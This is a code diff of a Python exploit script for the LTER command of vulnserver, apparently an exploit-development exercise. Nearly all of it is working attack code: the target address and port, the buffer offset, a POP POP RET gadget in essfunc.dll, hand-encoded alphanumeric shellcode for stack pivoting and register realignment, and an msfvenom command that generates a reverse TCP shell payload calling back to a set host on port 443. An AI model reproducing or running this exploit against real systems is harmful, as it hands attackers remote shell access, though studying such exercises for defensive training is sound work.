@@ -5,8 +5,6 @@ import sys
 host = "192.168.80.131" 
 port = 9999
 
-
-#buffer = "LTER /.:/"+ "A" * 4000 + "\r\n"
 crashcmd = "LTER /.:/ "
 offset = 3518
 #0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\Downloads\vulnserver-master\vulnserver-master\essfunc.dll)
@@ -18,7 +16,6 @@ jmp = "\x54\x58\x71\x08"
 # 04 37           ADD AL,37
 # 50              PUSH EAX
 # 5C              POP ESP
-
 
 jump = "\x66\x05\x70\x13\x04\x37\x50\x5C"
 jump += "\x25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35" #zero EAX
@@ -47,11 +44,9 @@ jump2 = "\x54\x58\x2C\x39\x50\x5C" #ESP to bottom of "A"'s
 #26: 50                      push   eax
 jump2 += "\x54\x58\x66\x2D\x28\x04\x50\x59\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x77\x61\x41\x41\x05\x66\x52\x41\x41\x05\x55\x61\x41\x41\x2D\x33\x33\x33\x33\x50"
 
-
 # restoring ESP to original position and realign ecx
 fixesp = "\x54\x58\x66\x2d\x66\x13\x50\x5c" #realign ESP
 fixesp += "\x51\x58\x04\x07\x04\x09\x50\x59"
-
 
 #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.131 LPORT=443 EXITFUNC=seh -e x86/alpha_mixed BufferRegister=ECX -b"\x00" -f C -v shellcode
 #Payload size: 701 bytes
